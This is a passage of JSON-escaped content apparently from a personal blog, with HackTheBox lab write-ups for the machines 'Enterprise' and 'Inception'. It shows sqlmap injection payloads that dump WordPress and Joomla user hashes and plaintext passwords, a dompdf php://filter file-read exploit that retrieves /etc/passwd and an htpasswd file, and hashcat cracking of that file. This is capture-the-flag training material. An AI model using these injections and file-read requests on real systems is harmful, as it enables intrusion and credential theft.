\u0026lt;b\u0026gt;16\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 1:\u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Catchable fatal error\u0026lt;/b\u0026gt;: Object of class mysqli_result could not be converted to string in \u0026lt;b\u0026gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;16\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; 2:\u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Catchable fatal error\u0026lt;/b\u0026gt;: Object of class mysqli_result could not be converted to string in \u0026lt;b\u0026gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;16\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; ... Okay, let\u0026rsquo;s pass the url to sqlmap I tried both, but only lcars_db.php was successful └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch --dbs ___ __H__ ___ ___[\u0026#39;]_____ ___ ___ {1.7.9#stable} |_ -| . [\u0026#39;] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org ... GET parameter \u0026#39;query\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests: --- Parameter: query (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: query=(SELECT (CASE WHEN (9664=9664) THEN 1 ELSE (SELECT 2239 UNION SELECT 5000) END)) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: query=1 AND (SELECT 5185 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(5185=5185,1))),0x7176627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: query=1 AND (SELECT 4270 FROM (SELECT(SLEEP(5)))CSgv) --- [15:59:36] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian 8 (jessie) web application technology: PHP 5.6.31, Apache 2.4.10 back-end DBMS: MySQL \u0026gt;= 5.0 [15:59:40] [INFO] fetching database names [15:59:40] [INFO] retrieved: \u0026#39;information_schema\u0026#39; [15:59:40] [INFO] retrieved: \u0026#39;joomla\u0026#39; [15:59:41] [INFO] retrieved: \u0026#39;joomladb\u0026#39; [15:59:41] [INFO] retrieved: \u0026#39;mysql\u0026#39; [15:59:41] [INFO] retrieved: \u0026#39;performance_schema\u0026#39; [15:59:42] [INFO] retrieved: \u0026#39;sys\u0026#39; [15:59:42] [INFO] retrieved: \u0026#39;wordpress\u0026#39; [15:59:42] [INFO] retrieved: \u0026#39;wordpressdb\u0026#39; available databases [8]: [*] information_schema [*] joomla [*] joomladb [*] mysql [*] performance_schema [*] sys [*] wordpress [*] wordpressdb Let\u0026rsquo;s dump tables └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress --tables ... Database: wordpress [12 tables] +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ Let\u0026rsquo;s dump wp_users └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_users --dump ... Database: wordpress Table: wp_users [1 entry] +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | 1 | \u0026lt;blank\u0026gt; | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0 | william.riker | william-riker | 2017-09-03 19:20:56 | \u0026lt;blank\u0026gt; | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ ... We can also dump joomladb tables └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb --tables ... Database: joomladb [72 tables] +-------------------------------+ | edz2g_assets | | edz2g_associations | | edz2g_banner_clients | | edz2g_banner_tracks | | edz2g_banners | | edz2g_categories | ... There are bunch of tables, we only need edz2g_users └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D joomladb -T edz2g_users --dump ... [2 entries] +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | id | otep | email | name | otpKey | params | block | password | username | sendEmail | activation | resetCount | registerDate | requireReset | lastResetTime | lastvisitDate | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ | 400 | \u0026lt;blank\u0026gt; | geordi.la.forge@enterprise.htb | Super User | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy | geordi.la.forge | 1 | 0 | 0 | 2017-09-03 19:30:04 | 0 | 0000-00-00 00:00:00 | 2017-10-17 04:24:50 | | 401 | \u0026lt;blank\u0026gt; | guinan@enterprise.htb | Guinan | \u0026lt;blank\u0026gt; | {\u0026#34;admin_style\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;admin_language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;language\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;editor\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;helpsite\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;timezone\u0026#34;:\u0026#34;\u0026#34;} | 0 | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q | Guinan | 0 | \u0026lt;blank\u0026gt; | 0 | 2017-09-06 12:38:03 | 0 | 0000-00-00 00:00:00 | 0000-00-00 00:00:00 | +-----+---------+--------------------------------+------------+---------+----------------------------------------------------------------------------------------------+---------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+ We also saw posts with passwords Let\u0026rsquo;s dump them too There will be bunch of posts, we have to grep the ones we need from the output └─$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --batch -D wordpress -T wp_posts --dump ... [16:18:52] [INFO] table \u0026#39;wordpress.wp_posts\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv\u0026#39; [16:18:52] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/10.10.10.61\u0026#39; └─$ grep \u0026#34;password\u0026#34; /home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv ID,guid,pinged,to_ping,post_date,post_name,post_type,menu_order,post_title,ping_status,post_author,post_parent,post_status,post_content,post_excerpt,comment_count,post_date_gmt,post_modified,post_password,comment_status,post_mime_type,post_modified_gmt,post_content_filtered 66,http://enterprise.htb/?p=66,\u0026lt;blank\u0026gt;,\u0026lt;blank\u0026gt;,2017-09-06 15:40:30,\u0026lt;blank\u0026gt;,post,0,Passwords,open,1,0,draft,Needed somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n ,\u0026lt;blank\u0026gt;,0,0000-00-00 00:00:00,2017-09-06 15:40:30,\u0026lt;blank\u0026gt;,open,\u0026lt;blank\u0026gt;,2017-09-06 14:40:30,\u0026lt;blank\u0026gt; 67,http://enterprise.htb/?p=67,\u0026lt;blank\u0026gt;,\u0026lt;blank\u0026gt;,2017-09-06 15:28:35,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n ,\u0026lt;blank\u0026gt;,0,2017-09-06 14:28:35,2017-09-06 15:28:35,\u0026lt;blank\u0026gt;,closed,\u0026lt;blank\u0026gt;,2017-09-06 14:28:35,\u0026lt;blank\u0026gt; 68,http://enterprise.htb/?p=68,\u0026lt;blank\u0026gt;,\u0026lt;blank\u0026gt;,2017-09-06 15:40:30,66-revision-v1,revision,0,Passwords,closed,1,66,inherit,Needed somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n ,\u0026lt;blank\u0026gt;,0,2017-09-06 14:40:30,2017-09-06 15:40:30,\u0026lt;blank\u0026gt;,closed,\u0026lt;blank\u0026gt;,2017-09-06 14:40:30,\u0026lt;blank\u0026gt; └─$ grep \u0026#34;password\u0026#34; /home/kali/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv | cut -d\u0026#39;,\u0026#39; -f14 | sed \u0026#39;s/\\\\r\\\\n\\\\r\\\\n/\\n/g\u0026#39; | sort -u | grep -v quickly | grep -v post_content enterprisencc170 u*Z14ru0p#ttj83zS6 ZD3YxfnSjezg67JZ ZxJyhGem4k338S2Y So now we have potential creds and usernames, we can try to login to wordpress and joomla ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/enterprise/images/enterprise.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/enterprise/","summary":"Enterprise Enumeration nmap └─$ nmap -Pn -p- 10.10.10.61 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 18:42 BST Nmap scan report for enterprise.htb (10.10.10.61) Host is up (0.14s latency). Not shown: 65529 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 5355/tcp filtered llmnr 8080/tcp open http-proxy 32812/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds └─$ nmap -Pn -p22,80,443,8080 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: Enterprise"},{"categories":null,"contents":"Inception Enumeration nmap └─$ nmap -Pn -p- 10.10.10.67 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:11 BST Stats: 0:05:40 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 81.05% done; ETC: 19:18 (0:01:20 remaining) Nmap scan report for 10.10.10.67 (10.10.10.67) Host is up (0.10s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 3128/tcp open squid-http Nmap done: 1 IP address (1 host up) scanned in 416.34 seconds └─$ nmap -Pn -p80,3128 -sC -sV 10.10.10.67 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 19:19 BST Nmap scan report for 10.10.10.67 (10.10.10.67) Host is up (0.11s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Inception 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 43.26 seconds Web server feroxbuster └─$ feroxbuster -u http://10.10.10.67 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --depth 2 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.67 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.10.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔎 Extract Links │ true 💲 Extensions │ [txt, php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 2 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 403 GET 11l 32w -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 301 GET 9l 28w 311c http://10.10.10.67/images =\u0026gt; http://10.10.10.67/images/ 200 GET 8l 71w 2380c http://10.10.10.67/assets/js/ie/html5shiv.js 200 GET 174l 401w 5284c http://10.10.10.67/assets/js/main.js 200 GET 1187l 2417w 22010c http://10.10.10.67/assets/css/main.css 200 GET 12l 34w 228c http://10.10.10.67/assets/css/ie9.css 200 GET 27l 54w 422c http://10.10.10.67/assets/css/ie8.css 200 GET 1051l 169w 2877c http://10.10.10.67/ 200 GET 397l 4810w 190069c http://10.10.10.67/images/bg03.jpg 301 GET 9l 28w 311c http://10.10.10.67/assets =\u0026gt; http://10.10.10.67/assets/ 200 GET 69l 328w 2307c http://10.10.10.67/README.txt 200 GET 63l 2733w 17128c http://10.10.10.67/LICENSE.txt Foothold We saw a squid proxy Let\u0026rsquo;s configure proxychains Add http 10.10.10.67 3128 to /etc/proxychains4.conf Now we can nmap └─$ proxychains nmap -Pn -sC -sV 127.0.0.1 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 17:06 BST Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 2.20% done; ETC: 17:11 (0:04:27 remaining) Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 2.60% done; ETC: 17:11 (0:04:22 remaining) Stats: 0:03:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 67.70% done; ETC: 17:11 (0:01:41 remaining) Nmap scan report for localhost (127.0.0.1) Host is up (0.30s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 93:ad:d8:31:eb:db:c3:30:8e:96:c4:60:82:8b:4f:c4 (RSA) | 256 1e:a8:07:32:25:c2:f9:a7:65:98:0e:52:15:3d:96:f7 (ECDSA) |_ 256 37:1d:45:db:f6:b1:2a:92:50:13:69:de:77:a4:ef:ae (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Inception |_http-server-header: Apache/2.4.18 (Ubuntu) 3128/tcp open http-proxy Squid http proxy 3.5.12 |_http-server-header: squid/3.5.12 |_http-title: ERROR: The requested URL could not be retrieved Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 374.76 seconds └─$ proxychains ssh root@localhost [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 Warning: Permanently added \u0026#39;localhost\u0026#39; (ED25519) to the list of known hosts. root@localhost\u0026#39;s password: We could also use wfuzz to perform a scan using squid as proxy └─$ wfuzz -u http://127.0.0.1:FUZZ -z range,1-65535 -p 10.10.10.67:3128:HTTP --hw 399 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://127.0.0.1:FUZZ/ Total requests: 65535 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000022: 200 2 L 4 W 60 Ch \u0026#34;22\u0026#34; 000000080: 200 1051 L 169 W 2877 Ch \u0026#34;80\u0026#34; 000003128: 400 151 L 416 W 3521 Ch \u0026#34;3128\u0026#34; We saw a comment on port 80 about dompdf If we visit /dompdf, we have a hit and the version is 0.6.0 We have a exploit └─$ curl -s \u0026#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd\u0026#39; %PDF-1.3 1 0 obj \u0026lt;\u0026lt; /Type /Catalog ... BT 34.016 734.579 Td /F1 12.0 Tf [(cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=)] TJ ET endstream ... └─$ echo \u0026#34;cm9vd...\u0026#34; | base64 -d root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin cobb:x:1000:1000::/home/cobb:/bin/bash Let\u0026rsquo;s enumerate Can\u0026rsquo;t read anything in cobb\u0026rsquo;s home directory We can check apache\u0026rsquo;s config file for additional vhosts Also squid.conf /etc/squid/squid.conf But nothing there └─$ curl -s \u0026#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf\u0026#39; ... PFZpcnR1YWxIb3N0ICo6ODA+CgkjIFRoZSBTZXJ2ZXJOYW1lIGRpcmVjdGl2ZSBzZXRzIHRoZSByZXF1ZXN0IHNjaGVtZSwgaG9zdG5hbWUgYW5kIHBvcnQgdGhhdAoJIyB0aGUgc2VydmVyIHVzZXMgdG8gaWRlbnRpZnkgaXRzZWxmLiBUaGlzIGlzIHVzZWQgd2hlbiBjcmVhdGluZwoJIyByZWRpcmVjdGlvbiBVUkxzLiBJbiB0aGUgY29udGV4dCBvZiB2aXJ0dWFsIGhvc3RzLCB0aGUgU2VydmVyTmFtZQoJIyBzcGVjaWZpZXMgd2hhdCBob3N0bmFtZSBtdXN0IGFwcGVhciBpbiB0aGUgcmVxdWVzdCdzIEhvc3Q6IGhlYWRlciB0bwoJIyBtYXRjaCB0aGlzIHZpcnR1YWwgaG9zdC4gRm9yIHRoZSBkZWZhdWx0IHZpcnR1YWwgaG9zdCAodGhpcyBmaWxlKSB0aGlzCgkjIHZhbHVlIGlzIG5vdCBkZWNpc2l2ZSBhcyBpdCBpcyB1c2VkIGFzIGEgbGFzdCByZXNvcnQgaG9zdCByZWdhcmRsZXNzLgoJIyBIb3dldmVyLCB5b3UgbXVzdCBzZXQgaXQgZm9yIGFueSBmdXJ0aGVyIHZpcnR1YWwgaG9zdCBleHBsaWNpdGx5LgoJI1NlcnZlck5hbWUgd3d3LmV4YW1wbGUuY29tCgoJU2VydmVyQWRtaW4gd2VibWFzdGVyQGxvY2FsaG9zdAoJRG9jdW1lbnRSb290IC92YXIvd3d3L2h0bWwKCgkjIEF2YWlsYWJsZSBsb2dsZXZlbHM6IHRyYWNlOCwgLi4uLCB0cmFjZTEsIGRlYnVnLCBpbmZvLCBub3RpY2UsIHdhcm4sCgkjIGVycm9yLCBjcml0LCBhbGVydCwgZW1lcmcuCgkjIEl0IGlzIGFsc28gcG9zc2libGUgdG8gY29uZmlndXJlIHRoZSBsb2dsZXZlbCBmb3IgcGFydGljdWxhcgoJIyBtb2R1bGVzLCBlLmcuCgkjTG9nTGV2ZWwgaW5mbyBzc2w6d2FybgoKCUVycm9yTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2Vycm9yLmxvZwoJQ3VzdG9tTG9nICR7QVBBQ0hFX0xPR19ESVJ9L2FjY2Vzcy5sb2cgY29tYmluZWQKCgkjIEZvciBtb3N0IGNvbmZpZ3VyYXRpb24gZmlsZXMgZnJvbSBjb25mLWF2YWlsYWJsZS8sIHdoaWNoIGFyZQoJIyBlbmFibGVkIG9yIGRpc2FibGVkIGF0IGEgZ2xvYmFsIGxldmVsLCBpdCBpcyBwb3NzaWJsZSB0bwoJIyBpbmNsdWRlIGEgbGluZSBmb3Igb25seSBvbmUgcGFydGljdWxhciB2aXJ0dWFsIGhvc3QuIEZvciBleGFtcGxlIHRoZQoJIyBmb2xsb3dpbmcgbGluZSBlbmFibGVzIHRoZSBDR0kgY29uZmlndXJhdGlvbiBmb3IgdGhpcyBob3N0IG9ubHkKCSMgYWZ0ZXIgaXQgaGFzIGJlZW4gZ2xvYmFsbHkgZGlzYWJsZWQgd2l0aCAiYTJkaXNjb25mIi4KCSNJbmNsdWRlIGNvbmYtYXZhaWxhYmxlL3NlcnZlLWNnaS1iaW4uY29uZgoJQWxpYXMgL3dlYmRhdl90ZXN0X2luY2VwdGlvbiAvdmFyL3d3dy9odG1sL3dlYmRhdl90ZXN0X2luY2VwdGlvbgoJPExvY2F0aW9uIC93ZWJkYXZfdGVzdF9pbmNlcHRpb24+CgkJT3B0aW9ucyBGb2xsb3dTeW1MaW5rcwoJCURBViBPbgoJCUF1dGhUeXBlIEJhc2ljCgkJQXV0aE5hbWUgIndlYmRhdiB0ZXN0IGNyZWRlbnRpYWwiCgkJQXV0aFVzZXJGaWxlIC92YXIvd3d3L2h0bWwvd2ViZGF2X3Rlc3RfaW5jZXB0aW9uL3dlYmRhdi5wYXNzd2QKCQlSZXF1aXJlIHZhbGlkLXVzZXIKCTwvTG9jYXRpb24+CjwvVmlydHVhbEhvc3Q+CgojIHZpbTogc3ludGF4PWFwYWNoZSB0cz00IHN3PTQgc3RzPTQgc3Igbm9ldAo= ... \u0026lt;VirtualHost *:80\u0026gt; # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request\u0026#39;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/html # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with \u0026#34;a2disconf\u0026#34;. #Include conf-available/serve-cgi-bin.conf Alias /webdav_test_inception /var/www/html/webdav_test_inception \u0026lt;Location /webdav_test_inception\u0026gt; Options FollowSymLinks DAV On AuthType Basic AuthName \u0026#34;webdav test credential\u0026#34; AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd Require valid-user \u0026lt;/Location\u0026gt; \u0026lt;/VirtualHost\u0026gt; # vim: syntax=apache ts=4 sw=4 sts=4 sr noet Let\u0026rsquo;s retrieve /var/www/html/webdav_test_inception/webdav.passwd └─$ curl -s \u0026#39;http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd\u0026#39; └─$ echo \u0026#34;d2ViZGF2X3Rlc3RlcjokYXByMSQ4ck83U21pNCR5cW43SC5HdkpGdHNUb3UxYTdWTUUwCg==\u0026#34; | base64 -d webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0 Crack it └─$ hashcat --user hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting in autodetect mode ... $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69 Session..........: hashcat Status...........: Cracked Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR)) Hash.Target......: $apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0 Time.Started.....: Sun Oct 22 17:21:01 2023 (4 secs) Time.Estimated...: Sun Oct 22 17:21:05 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File 